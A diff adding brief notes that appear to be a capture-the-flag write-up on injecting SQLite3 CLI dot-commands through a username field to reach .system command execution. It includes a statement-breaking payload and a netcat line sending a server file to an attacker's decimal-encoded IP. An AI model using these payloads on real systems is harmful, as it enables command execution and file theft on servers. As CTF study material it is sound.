@@ -1,0 +1,44 @@
+sqlite3
+
+Restriction
+	len(username) > 32 and len(password) > 32
+
+	re.sub(r'([^_\.\sa-zA-Z0-9])', r'\\\1', s)
+	=> Add backslashes to escape.
+
+In SQLite3, you need to escape ' and " in a string literal by putting the same character twice instead of prepending backslashes.
+
+
+In CLI version of SQLite3, by combinating " and ;, you can end SQL statement and then execute next query or SQLite3 commands.
+	Username Payload:
+		";\n.tables\n
+
+	sqlite> SELECT * FROM users WHERE username="\"\;
+	Error: unrecognized token: "\"
+	sqlite> .tables
+	users
+
+However, there is no output if error occurs
+	if e:
+        raise Exception(e)
+    result = []
+    for row in o.decode().split('\n'):
+        if row == '': break
+        result.append(tuple(row.split('|')))
+    return result
+
+Use .system command in SQLite3
+
+============== Solution 1 (official) ==============
+Write the file in tmp char by char, and execute
+
+python3 solve.py
+
+
+============== Solution 2 ==============
+
+Your Server
+	echo "cat templates/index.html | nc 2356222095 6666" | nc -vvlp 9
+	nc -lvnp 6666
+User Payload
+	python3 solve2.py
